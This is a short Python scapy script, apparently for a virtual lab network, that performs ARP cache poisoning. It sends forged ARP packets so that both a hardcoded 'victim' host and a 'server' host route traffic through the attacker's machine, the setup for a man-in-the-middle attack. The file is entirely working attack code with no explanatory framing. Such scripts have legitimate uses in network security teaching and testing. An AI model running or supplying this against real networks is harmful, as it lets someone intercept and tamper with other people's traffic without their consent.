from scapy.all import *


class DefaultTool:
    def __init__(self, victim_ip, server_ip):
        self.victim_ip = victim_ip
        self.server_ip = server_ip
        self.network_interface = "enp0s3"

    @staticmethod
    def get_mac_from_ip(ip):
        result, _ = arping(ip)
        for _, received in result:
            return received[Ether].src

    def arp_poisoning(self):
        victim_mac = self.get_mac_from_ip(self.victim_ip)
        server_mac = self.get_mac_from_ip(self.server_ip)
        # getting self mac will throw exception if enp0s3 network interface does not exit
        attacker_mac = get_if_hwaddr(self.network_interface)

        victim_arp = Ether() / ARP()
        server_arp = Ether() / ARP()

        # Poison the victim's ARP table
        victim_arp[Ether].src = attacker_mac
        victim_arp[ARP].hwsrc = attacker_mac
        victim_arp[ARP].psrc = server_ip
        victim_arp[ARP].hwdst = victim_mac
        victim_arp[ARP].pdst = victim_ip

        sendp(victim_arp, iface=self.network_interface)

        # Poison the server's ARP table
        server_arp[Ether].src = attacker_mac
        server_arp[ARP].hwsrc = attacker_mac
        server_arp[ARP].psrc = victim_ip
        server_arp[ARP].hwdst = server_mac
        server_arp[ARP].pdst = server_ip

        sendp(server_arp, iface=self.network_interface)

        time.sleep(3)


victim_ip = "192.168.56.103"
server_ip = "192.168.56.102"

tool = DefaultTool(victim_ip, server_ip)
tool.arp_poisoning()
